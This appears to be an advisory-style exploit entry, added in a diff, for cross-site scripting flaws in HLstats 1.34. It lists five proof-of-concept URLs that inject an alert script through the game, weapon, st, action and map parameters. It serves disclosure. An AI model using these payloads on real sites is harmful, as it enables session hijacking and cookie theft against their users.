@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/19771/info
+
+HLstats is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues may help an attacker steal cookie-based authentication credentials and launch other attacks.
+
+Version 1.34 is reported vulnerable; other versions may also be affected.
+
+http://www.example.com/index.php?mode=players&game=%3Cscript%3Ealert(123)%3C/script%3E 
+http://www.example.com/index.php?mode=weaponinfo&weapon=%3Cscript%3Ealert(123)%3C/script%3E&game=tfc http://www.example.com/index.php?mode=search&q=whatever&st=%3Cscript%3Ealert(123)%3C/script%3E&game=tfc http://www.example.com/index.php?mode=actioninfo&action=%3Cscript%3Ealert(123)%3C/script%3E&game=tfc http://www.example.com/index.php?mode=mapinfo&map=%3Cscript%3Ealert(123)%3C/script%3E&game=tfc (instead of 'tfc' you should use the game, HLstats is configurated for)
